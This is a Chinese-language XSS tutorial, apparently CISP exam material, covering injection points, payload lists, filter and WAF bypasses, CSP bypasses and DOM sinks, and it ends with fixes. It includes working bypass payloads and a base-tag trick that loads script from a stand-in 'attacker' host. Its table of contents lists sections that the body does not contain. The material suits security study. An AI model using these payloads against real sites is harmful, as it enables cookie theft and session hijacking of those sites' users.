# XSS 跨站脚本漏洞挖掘与 Bypass

> **📘 文档定位**：CISP 考试 漏洞挖掘 核心 | 难度：⭐⭐⭐⭐ | 预计阅读：28 分钟
>
> 系统讲解 XSS 漏洞的挖掘方法论（反射型/存储型/DOM型）、Bypass 技巧与 WAF 绕过、自动化检测工具及修复方案，是 Web 安全漏洞挖掘的基础必修课。

---

## 导航目录

- [一、漏洞概述](#一漏洞概述)
- [二、反射型 XSS 挖掘](#二反射型-xss-挖掘)
- [三、存储型 XSS 挖掘](#三存储型-xss-挖掘)
- [四、DOM 型 XSS 挖掘](#四dom-型-xss-挖掘)
- [五、Bypass 与 WAF 绕过](#五bypass-与-waf-绕过)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 一、漏洞概述

跨站脚本（Cross-Site Scripting，简称 XSS）是攻击者在页面中注入恶意 JavaScript 代码，使访问者浏览器执行非预期脚本，从而造成 Cookie 窃取、会话劫持、钓鱼、键盘记录、浏览器沙箱突破等危害的漏洞。XSS 分为三类：

| 类型 | 说明 | 典型场景 |
|------|------|---------|
| 反射型 XSS | payload 出现在 URL 参数中，由服务端反射回页面 | 搜索框、404 页、错误提示 |
| 存储型 XSS | payload 被写入数据库 / 文件，后续访问均触发 | 留言板、评论、昵称、头像文件名 |
| DOM 型 XSS | 纯前端 JavaScript 解析参数写入 innerHTML / document.write | URL `#` 后参数、location.hash |

## 2. 注入点识别

### 2.1 可能的注入位置

以下所有"可控字符串最终出现在 HTML 中"的位置都可能是 XSS 注入点：

- 搜索关键字、表单提交值
- 用户昵称、签名、评论内容
- URL 路径、`?q=` 查询参数、`#fragment`
- HTTP Header：`Referer`、`User-Agent`、自定义 Header
- 文件上传：文件名、`Content-Disposition: filename="..."`
- JSON/XML 接口字段在前端被直接渲染

### 2.2 基础测试 Payload 清单

提交以下内容观察页面响应：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
"><script>alert(1)</script>
' onmouseover='alert(1)
"><img src=x onerror=alert(document.domain)>
```

若弹窗或浏览器开发者工具出现脚本解析错误，说明存在 XSS 可能。

### 2.3 基于上下文的构造策略

根据注入位置的 HTML 上下文选择合适 payload：

```
1）在 HTML 正文：<p>INPUT</p>
   → <script>alert(1)</script>

2）在 HTML 标签属性：<input value="INPUT">
   → "><script>alert(1)</script>

3）在 JavaScript 字符串：var a = "INPUT";
   → ";alert(1);//

4）在 URL 属性：<a href="INPUT">
   → javascript:alert(1)

5）在事件属性：<div onload="INPUT">
   → alert(1)（无需标签，直接表达式）

6）在 CSS / style：background:url('INPUT')
   → expression(alert(1)) （仅旧版 IE）
```

## 3. 常见过滤与绕过

### 3.1 关键字黑名单绕过

```html
# script 被过滤
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe/src=javascript:alert(1)>

# alert 被过滤
prompt(1)
confirm(1)
eval('ale'+'rt(1)')
window['ale'+'rt'](1)

# 引号被过滤
<img src=x onerror=alert`1`>
<img src=x onerror=alert&#40;1&#41;>

# 空格被过滤
<img/src=x onerror=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>

# 括号被过滤（模板字符串）
<script>alert`1`</script>
```

### 3.2 HTML 实体编码绕过

当页面会把输入转换为实体（如 `&amp;`、`&lt;`）时，仍可能在以下场景被绕过：

- 属性值未加引号：`<input value=INPUT>`，此时空格即可闭合
- 注入在 `href` / `src` / `action` 属性中，可用 `&#x6a;avascript:...`
- 部分浏览器会对 `javascript:` URL 中某些实体做解码

### 3.3 CSP（Content Security Policy）绕过

CSP 限制脚本来源，常见策略与绕过方法：

| CSP 策略 | 绕过思路 |
|---------|---------|
| `script-src 'self'` | 利用同域 JSONP 接口 / 任意上传 / Angular / Vue 模板注入 |
| `script-src 'unsafe-inline'` | 等同于关闭 CSP 对脚本的保护 |
| `script-src https://cdn.example.com` | 寻找该 CDN 上可控制内容的脚本路径 |
| `base-uri 'self'` 缺失 | 用 `<base href=...>` 改变相对路径加载 |

实战 payload 示例：

```html
<!-- JSONP 接口绕过 script-src 'self' -->
<script src="/api/jsonp?cb=alert(1)//"></script>

<!-- Angular 模板注入 -->
<input ng-app>{{constructor.constructor('alert(1)')()}}</input>

<!-- 利用 base 标签劫持相对路径脚本 -->
<base href="http://attacker/">
<script src="js/common.js"></script>
```

## 4. DOM 型 XSS 的专项挖掘

DOM 型 XSS 完全发生在前端，服务端可能完全不参与。关注以下 JavaScript 调用：

```javascript
// 高危 sink
document.write(INPUT)
document.body.innerHTML = INPUT
eval(INPUT)
new Function(INPUT)
window.location = INPUT
elem.setAttribute('onclick', INPUT)

// 常见 source
location.hash
location.search
document.referrer
window.name
postMessage
localStorage
```

挖掘思路：

1. 在浏览器 DevTools 打开 Sources → XHR/fetch Breakpoints + Event Listener Breakpoints（Script）
2. 搜索代码中 `innerHTML` / `eval` / `document.write` 关键字
3. 跟踪 source 到 sink 的数据流，判断是否经过充分过滤

## 5. 修复与防御建议

1. **输出编码**：在把变量渲染到 HTML / JS / CSS / URL 之前，针对每种上下文做正确编码（如 HTML 使用 `htmlspecialchars`，JS 使用 `JSON.stringify` 转义）。
2. **CSP 响应头**：部署严格 CSP，禁用 `unsafe-inline` / `unsafe-eval`，限制脚本来源。
3. **HttpOnly / Secure Cookie**：关键 Session Cookie 设置 `HttpOnly`，阻止脚本读取。
4. **输入校验**：对用户输入进行长度、格式（邮箱、手机号、URL）等校验，拒绝明显恶意字符。
5. **富文本场景**：使用白名单策略的 HTML 过滤器（如 DOMPurify），不要自行实现正则过滤。
